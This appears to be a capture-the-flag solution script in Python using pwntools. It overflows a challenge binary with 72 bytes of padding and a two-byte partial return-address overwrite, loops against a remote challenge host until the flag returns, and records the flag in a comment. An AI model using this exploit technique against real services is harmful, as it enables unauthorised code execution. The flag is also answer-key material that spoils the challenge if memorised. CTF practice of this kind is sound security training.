from pwn import *

#context.log_level = "error"

padd = b'A'* 72 
while True:
    #p =process("./chall")
    p = remote("hidden2.ctf.intigriti.io",1337)

    # gdb.attach(p,gdbscript='''          
    # b* input+137  
    # b* input+94         
    # ''')

    payload = padd + b'\xd9\x11' 
    p.send(payload)
    print(p.recv())

    try:
        recvmess = p.recv(4096)
        p.close()
        if b'INTIGRITI' in recvmess:
            print(recvmess)

            break
    except:
        p.close()

# INTIGRITI{h1dd3n_r3T2W1n_G00_BrrRR}